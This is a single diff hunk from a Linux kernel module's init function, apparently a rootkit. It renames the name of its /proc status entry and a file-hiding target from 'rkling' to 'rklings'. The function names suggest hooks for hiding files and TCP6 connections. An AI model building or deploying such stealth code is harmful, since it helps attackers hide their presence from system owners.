@@ -607,13 +607,13 @@ static int __init rk_init(void)
 	if (error)
 		goto unregister_tcp6;
 
-	proc_entry = proc_create("rkling_status", 0400, NULL, &rk_proc_ops);
+	proc_entry = proc_create("rklings_status", 0400, NULL, &rk_proc_ops);
 	if (!proc_entry) {
 		error = -ENOMEM;
 		goto unregister_mkdir;
 	}
 
-	rk_target_add(&file_targets, "rkling");
+	rk_target_add(&file_targets, "rklings");
 	{
 		char pid_str[12];
 
